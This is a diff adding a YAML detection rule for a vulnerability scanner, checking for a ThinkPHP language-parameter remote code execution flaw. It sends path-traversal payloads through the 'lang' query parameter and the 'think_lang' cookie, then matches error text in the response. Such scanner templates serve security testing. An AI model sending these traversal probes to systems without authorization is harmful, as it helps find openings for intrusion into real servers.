@@ -1,0 +1,24 @@
+name: poc-yaml-thinkphp-lang-rce
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /?lang=../../../../../../public/index
+        expression: response.status == 500 && response.body.bcontains(b"is_file()") && response.body.bcontains(b"src/lang")
+    r1:
+        request:
+            cache: true
+            method: GET
+            headers:
+                Cookie: think_lang=../../../../../../public/index
+        expression: response.status == 500 && response.body.bcontains(b"is_file()") && response.body.bcontains(b"src/lang")
+expression: r0() || r1()
+detail:
+    author: yt
+    links:
+        - https://tttang.com/archive/1865/
+    vulnerability:
+        level: high
